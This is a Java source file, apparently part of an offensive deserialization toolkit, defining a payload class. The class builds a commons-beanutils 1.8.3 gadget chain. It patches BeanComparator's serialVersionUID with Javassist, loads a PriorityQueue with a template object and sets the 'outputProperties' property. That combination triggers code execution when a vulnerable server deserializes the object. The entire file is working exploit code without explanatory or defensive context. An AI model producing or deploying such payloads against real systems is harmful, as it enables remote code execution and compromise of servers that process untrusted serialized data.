package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.JavassistClassLoader;
import com.summersec.attack.deser.util.Reflections;


import com.summersec.attack.deser.util.StandardExecutorClassLoader;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

// Apache Commons Lang
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"SummerSec"})
public class CommonsBeanutilsObjectToStringComparator_183 implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {
//        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
//        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        System.out.println(u.getPackage());
//
//        Object beanComparator = u.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, new ObjectToStringComparator() );

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());

        ObjectToStringComparator stringComparator = new ObjectToStringComparator();


//        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);


        queue.add(stringComparator);
        queue.add(stringComparator);


        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
//        Reflections.setFieldValue(beanComparator, "comparator", stringComparator);

        return (Queue)queue;
    }
}
